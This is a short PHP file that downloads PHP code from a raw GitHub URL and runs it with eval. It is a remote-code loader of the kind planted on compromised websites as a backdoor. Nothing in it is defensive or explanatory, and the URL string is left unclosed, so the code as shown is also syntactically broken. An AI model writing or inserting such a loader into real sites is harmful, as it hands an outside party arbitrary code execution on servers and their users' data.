<?php $hellokitty = file_get_contents(urldecode('https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/genkopass.php));

$hellokitty = "?> ".$hellokitty;
eval($hellokitty);